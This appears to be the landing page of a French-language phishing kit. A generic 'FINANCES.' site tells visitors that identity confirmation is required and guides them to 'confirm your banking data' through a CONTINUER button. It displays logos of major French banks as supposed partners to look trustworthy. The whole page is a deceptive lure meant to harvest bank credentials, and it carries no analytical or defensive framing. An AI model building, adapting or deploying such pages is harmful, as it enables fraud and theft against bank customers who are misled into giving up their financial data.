<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Confirmation d'identité</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="script.js"></script>
  </head>
  <body class="bg-gray-50 font-sans text-gray-800">
    <div class="flex flex-col items-center min-h-screen">
      <!-- Main Content -->
      <main class="flex flex-col items-center px-4 py-8 flex-1">
        <h1 class="text-2xl font-bold text-gray-800 mb-6">
          FINANCES<color class="text-blue-500">.</color>
        </h1>

        <!-- Loader -->
        <div class="relative w-20 h-20 mb-6">
          <div
            class="absolute inset-0 border-4 border-green-500 rounded-full animate-spin"
          ></div>
          <div
            class="absolute inset-0 flex items-center justify-center text-lg font-bold text-gray-800"
          >
            1
          </div>
        </div>

        <p class="text-center text-lg font-medium mb-6">
          Une confirmation d'identité est requise.
        </p>

        <!-- Instructions -->
        <div class="bg-white shadow-md rounded-lg p-6 w-full max-w-md">
          <p class="mb-4">
            Voici les étapes à suivre à la date d'aujourd'hui :
          </p>
          <ol class="list-decimal list-inside space-y-2 text-sm">
            <li>
              <span class="font-bold"
                >Cliquez sur continuer pour commencer</span
              >
            </li>
            <li>
              <span class="font-bold">Confirmez vos données Bancaire</span>
            </li>
            <li><span class="font-bold">Confirmez votre identité</span></li>
          </ol>
        </div>

        <!-- Continue Button -->
        <button
          onclick="nextPage('1.html')"
          class="mt-6 bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 px-6 rounded-md shadow-md focus:outline-none focus:ring-2 focus:ring-blue-400"
        >
          CONTINUER
        </button>
      </main>

      <!-- Footer -->
      <footer class="w-full py-4 bg-gray-100 text-center">
        <!-- Partners Section -->
        <div class="mt-6">
          <p class="text-center text-xs text-gray-400">Nos Partenaires</p>
          <div class="flex justify-center gap-2 mt-2">
            <img
              src="assets/p1.png"
              alt="Crédit Agricole"
              class="w-8 h-8 rounded-full"
            />
            <img
              src="assets/p2.jpg"
              alt="BNP Paribas"
              class="w-8 h-8 rounded-full"
            />
            <img
              src="assets/p3.png"
              alt="La Banque Postale"
              class="w-8 h-8 rounded-full"
            />
            <img
              src="assets/p5.png"
              alt="Société Générale"
              class="w-8 h-8 rounded-full"
            />
            <img src="assets/p6.jpg" alt="CIC" class="w-8 h-8 rounded-full" />
            <img src="assets/p7.png" alt="LCL" class="w-8 h-8 rounded-full" />
            <img
              src="assets/p8.png"
              alt="Caisse d'Épargne"
              class="w-8 h-8 rounded-full"
            />
            <img
              src="assets/p9.png"
              alt="Crédit Mutuel"
              class="w-8 h-8 rounded-full"
            />
          </div>
        </div>
      </footer>
    </div>
  </body>
</html>
